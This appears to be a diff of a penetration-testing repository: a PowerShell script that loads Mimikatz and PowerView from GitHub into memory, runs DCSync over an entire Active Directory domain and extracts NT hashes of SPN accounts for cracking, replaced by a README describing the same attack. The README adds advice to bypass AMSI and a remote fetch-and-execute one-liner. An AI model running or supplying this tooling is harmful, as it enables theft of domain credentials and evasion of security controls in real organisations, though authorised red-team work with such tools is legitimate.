@@ -1,72 +1,41 @@
-# Author: LRVT - https://github.com/l4rm4nd/
+# Invoke-SPNDCSync
 
-# variables
-$DATE = $(get-date -f yyyyMMddThhmm)
-$PATH = "C:\temp\" + $DATE + "_" + "DCSYNC" + "\"
-$EXT = ".txt"
-$LOG = $PATH + $DATE + "_" + "DCSync_NTLM_full" + $EXT
-$SPNLOG = $PATH + $DATE + "_" + "spnuser_fulldetails" + $EXT
-$SPNUSERS = $PATH + $DATE + "_" + "spnuser_samaccountname" + $EXT
-$SPNHASHES = $PATH + $DATE + "_" + "DCSYNC_NTLM_SPN_full" + $EXT
-$HASHES = $PATH + $DATE + "_" + "DCSync_NTLM_Hashes" + $EXT
-$USERS = $PATH + $DATE + "_" + "DCSync_NTLM_Users" + $EXT
-$IMPORTFILE = $PATH + $DATE + "_" + "DCSync_NTLM_UserHash_Import" + $EXT
+PowerShell script to enumerate Kerberoastable SPN user account and retrieve their NT-Hash via Mimikatz for password cracking.
 
-# download mimikatz into memory
-Write-Host "[INFO] Downloading Mimikatz into Memory" -ForegroundColor Gray
-iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/nishang/master/Gather/Invoke-Mimikatz.ps1')
+This is an alternative to cracking Kerberos-Hashes, since NT-Hashes can be cracked 135 times faster.
 
-# download poweview into memory
-Write-Host "[INFO] Downloading PowerView into Memory" -ForegroundColor Gray
-iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/PowerSploit/dev/Recon/PowerView.ps1')
+## General Preparation
 
-# print out domain context
-$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
-Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red
+1. Connect to the internal AD network via VPN or directly, if on-site.
+2. Configure your operating system's proxy to use the client's proxy. Internet is required to download Invoke-Mimikatz and Invoke-DCSync PS scripts. Alternatively, configure a known proxy via PS:
 
-$confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
-if ($confirmation -eq 'y') {
+````
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:8080"
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
+````
+3. Open a new PowerShell terminal as another user; use a privileged domain user account with DCSync rights
 
-    # create directory for storage
-    Write-Host ""
-    Write-Host "[INFO] Creating new directory at $PATH" -ForegroundColor Gray
-    New-Item -ItemType Directory -Force -Path $PATH | Out-Null
+````
+runas.exe /netonly /noprofile /user:mydomain.prod.dom\dcsyncUser "powershell.exe -ep bypass"
+````
 
-    # enumerate user accounts with service principal name (SPN)
-    Write-Host "[INFO] Enumerating user accounts with set SPN" -ForegroundColor Gray
-    Get-DomainUser -SPN > $SPNLOG
-    $loop = Get-DomainUser -SPN | Select-Object -property samaccountname | foreach { $_.samaccountname }
-    $loop > $SPNUSERS
+4. Verify authenticated AD access within your PowerShell terminal window
 
-    # execute DCSync over the whole domain
-    Write-Host "[!] Exporting NT-Hashes via DCSync" -ForegroundColor Yellow
-    $command = '"log ' + $LOG + '" "lsadump::dcsync /domain:'+ $DOMAIN +' /all /csv"'
-    Invoke-Mimikatz -Command $command
+## SPN DCSync Preparation
 
-    # loop over DCSync log file and filter for SPN user accounts
-    Write-Host "[!] Extracting SPN users from DCSync logfile" -ForegroundColor Yellow
-    foreach ($spn in $loop) {
-    get-content $LOG -ReadCount 1000 |
-        foreach { $_ -match $spn } >> $SPNHASHES
-    }
+It is recommended to bypass AMSI for the current PowerShell session. Use a 0-Day payload!
 
-    # GET NT-HASHES ONLY
-    Write-Host "[~] Extracting NT-Hashes from logfile" -ForegroundColor Yellow
-    (Get-Content -LiteralPath $SPNHASHES) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
+# SPN DCSync Execution
 
-    # GET USERS ONLY
-    Write-Host "[~] Extracting users from logfile" -ForegroundColor Yellow
-    (Get-Content -LiteralPath $SPNHASHES) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS
+Download ``Invoke-SPNDCSync.ps1`` into memory, which executes the DCSync process.
 
-    # CONCAT USER AND NT-HASH INTO OUTFILE
-    Write-Host "[~] Create user/hash merge file" -ForegroundColor Yellow
-    $File1 = Get-Content $USERS
-    $File2 = Get-Content $HASHES
-    for($i = 0; $i -lt $File1.Count; $i++)
-    {
-        ('{0},{1}' -f $File1[$i],$File2[$i]) |Add-Content $IMPORTFILE
-    }
+As a result, we will obtain four files located under C:\temp\ directory:
 
-}else{
-    Write-Host "[!] Script aborted due to wrong domain. Please hardcode the domain in the PS1 script (line 21)." -ForegroundColor Red
-}
+1. **DCSync_NTLM_full**: Just the complete logfile of running Mimikatz
+2. **DCSync_NTLM_Hashes**: Only contains the NT-Hashes
+3. **DCSync_NTLM_Users**: Only contains the employee's username
+4. **DCSync_NTLM_UserHash_Import**: Contains the tuple of username and hash
+
+````
+iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-SPNDCSync/main/Invoke-SPNDCSync.ps1')
+````
